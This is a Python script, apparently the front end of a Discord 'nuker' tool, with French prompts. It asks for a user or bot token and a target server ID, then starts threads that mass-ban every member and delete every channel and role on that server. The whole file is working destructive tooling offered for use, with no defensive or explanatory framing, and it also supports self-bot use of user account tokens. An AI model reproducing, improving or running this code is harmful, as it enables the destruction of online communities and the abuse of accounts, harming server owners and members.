import os, discord, threading
import backend
from discord.ext import commands
from colorama import Fore, Style, Back
from pystyle import *
MAXWORKERS = 200

header_final = """            ,o888888o.    8 888888888o.       ,o888888o.     b.             8     ,o888888o.        d888888o.
           8888     `88.  8 8888    `88.   . 8888     `88.   888o.          8  . 8888     `88.    .`8888:' `88.
        ,8 8888       `8. 8 8888     `88  ,8 8888       `8b  Y88888o.       8 ,8 8888       `8b   8.`8888.   Y8
        88 8888           8 8888     ,88  88 8888        `8b .`Y888888o.    8 88 8888        `8b  `8.`8888.
        88 8888           8 8888.   ,88'  88 8888         88 8o. `Y888888o. 8 88 8888         88   `8.`8888.
        88 8888           8 888888888P'   88 8888         88 8`Y8o. `Y88888o8 88 8888         88    `8.`8888.
        88 8888           8 8888`8b       88 8888        ,8P 8   `Y8o. `Y8888 88 8888        ,8P     `8.`8888.
        `8 8888       .8' 8 8888 `8b.     `8 8888       ,8P  8      `Y8o. `Y8 `8 8888       ,8P  8b   `8.`8888.
           8888     ,88'  8 8888   `8b.    ` 8888     ,88'   8         `Y8o.`  ` 8888     ,88'   `8b.  ;8.`8888
            `8888888P'    8 8888     `88.     `8888888P'     8            `Yo     `8888888P'      `Y8888P ,88P'"""

os.system('cls')
print(Colorate.Diagonal(Colors.black_to_white, Center.XCenter(header_final)))
os.system("title nuker (non connecté !)")
print("\n")
print(Colors.light_gray +  "   Si vous trouvez des bugs, rejoignez le discord et signalez les. Merci.")
print("\n")
print(Colors.light_gray + "   [?] Token ↓")
token = input("    ")
while True:
    print(Colors.light_gray + "   [?] Utilisez vous un bot ? [o/n] ↓")
    isBot = input("    ")
    if isBot == "o": isBot = True;break
    elif isBot == "n": isBot = False;break
    else: print(Colors.light_gray + "   [!] Erreur, veuillez donner une réponse correcte")
while True:
    try:
        print(Colors.light_gray + "   [?] ID du serveur cible ↓")
        target = int(input("    "));break
    except ValueError: print(Colors.light_gray + "   [!] Erreur, veuillez donner un nombre correct")

nuker = backend.nuker(token, isBot)
intents = discord.Intents.all()
intents.members = True
client = commands.Bot(command_prefix=">>>", help_command=None, self_bot=True, intents=intents) if isBot is not True else commands.Bot(command_prefix=">>>", help_command=None, self_bot=False, intents=intents)

@client.event
async def on_connect():
    os.system('cls')
    print(Colorate.Diagonal(Colors.black_to_white, Center.XCenter(header_final)))    
    print("\n")
    os.system("title nuker (connecté !)")
    print(Colors.light_gray + "   [...] En attente du client")
    await client.wait_until_ready()
    print(Colors.light_gray + "   [...] Le client est prêt")
    print(Colors.light_gray + "   [...] En préparation")
    chunkhappened = False
    try:
        guild = client.get_guild(target)
        chunk = await guild.chunk()
        chunkhappened = True
    except AttributeError:
        print(Colors.light_gray + "   [!] Erreur, récupération des membres impossible")
    print(Colors.dark_red + "   [!] Pressez ENTREE pour commencer")
    input("    ")
    if chunkhappened:
        for member in chunk:
            threading.Thread(target=nuker.ban, args=(target, member.id,)).start()
    if len(guild.channels) != 0 or None:
        for channel in guild.channels:
            threading.Thread(target=nuker.channel, args=(channel.id,)).start()
    if len(guild.roles) != 0 or None:
        for role in guild.roles:
            threading.Thread(target=nuker.role, args=(target, role.id,)).start()
    print(Colors.light_gray + "   [...] Tous les threads sont lancés")

    print(Colors.light_gray + "   [...] Connexion")
client.run(token)
